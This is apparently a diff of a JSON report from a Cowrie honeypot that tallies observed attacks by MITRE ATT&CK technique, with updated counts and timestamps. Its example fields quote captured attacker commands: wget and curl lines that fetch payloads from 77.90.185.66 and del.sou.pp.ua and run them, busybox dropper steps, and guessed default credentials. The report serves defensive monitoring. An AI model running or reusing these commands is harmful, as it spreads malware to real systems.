@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-10-22 20:08:36",
+  "generated": "2026-10-22 21:03:49",
   "totals": {
-    "commands": 361326,
-    "login_failed": 497037,
-    "login_success": 75001,
-    "sessions": 520518
+    "commands": 361568,
+    "login_failed": 497069,
+    "login_success": 75023,
+    "sessions": 520598
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 497037,
+      "count": 497069,
       "examples": [
         "root / 123456",
         "nobody / None",
@@ -21,14 +21,14 @@
         "admin / admin"
       ],
       "first": "2026-08-10T23:55:42.664651Z",
-      "last": "2026-10-22T20:07:09.668478Z",
-      "unique_ips": 7439
+      "last": "2026-10-22T21:00:50.659210Z",
+      "unique_ips": 7441
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 75001,
+      "count": 75023,
       "examples": [
         "root / admin",
         "uname -a / exit",
@@ -37,14 +37,14 @@
         "admin / vertex25ektks123"
       ],
       "first": "2026-08-10T23:55:55.666658Z",
-      "last": "2026-10-22T20:07:14.860153Z",
-      "unique_ips": 6101
+      "last": "2026-10-22T20:51:17.935026Z",
+      "unique_ips": 6104
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 40704,
+      "count": 40812,
       "examples": [
         "/bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -53,8 +53,8 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-11T00:40:37.500509Z",
-      "last": "2026-10-22T20:07:19.869499Z",
-      "unique_ips": 2277
+      "last": "2026-10-22T20:51:09.488661Z",
+      "unique_ips": 2278
     },
     {
       "id": "T1083",
@@ -76,7 +76,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 13528,
+      "count": 13529,
       "examples": [
         "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://77.90.185.66/wget",
@@ -85,14 +85,14 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-08-11T00:40:37.931453Z",
-      "last": "2026-10-22T19:37:57.599407Z",
-      "unique_ips": 2092
+      "last": "2026-10-22T20:15:53.666981Z",
+      "unique_ips": 2093
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 11029,
+      "count": 11031,
       "examples": [
         "uname -s -v -n -r -m",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
@@ -101,8 +101,8 @@
         "uname -s -m"
       ],
       "first": "2026-08-11T00:27:16.369209Z",
-      "last": "2026-10-22T20:01:25.164813Z",
-      "unique_ips": 1723
+      "last": "2026-10-22T20:15:53.666981Z",
+      "unique_ips": 1724
     },
     {
       "id": "T1033",
@@ -352,15 +352,15 @@
   "unmapped": [
     [
       "sh",
-      67767
+      67786
     ],
     [
       "system",
-      67231
+      67249
     ],
     [
       "shell",
-      41756
+      41775
     ],
     [
       "/bin/busybox",
@@ -368,15 +368,15 @@
     ],
     [
       "/bin/busybox HISILICON",
-      8745
+      8772
     ],
     [
       "enable",
-      7068
+      7086
     ],
     [
       "ping; sh",
-      5740
+      5758
     ],
     [
       "/bin/busybox UNSTABLE",
@@ -388,7 +388,7 @@
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      2858
+      2867
     ],
     [
       "sh .k",
@@ -433,10 +433,10 @@
   ],
   "data_since": "2026-08-10T23:55:42",
   "last_24h": {
-    "sessions": 11734,
-    "logins": 12105,
-    "commands": 11643,
+    "sessions": 11707,
+    "logins": 12056,
+    "commands": 11547,
     "downloads": 64,
-    "unique_ips": 467
+    "unique_ips": 469
   }
 }
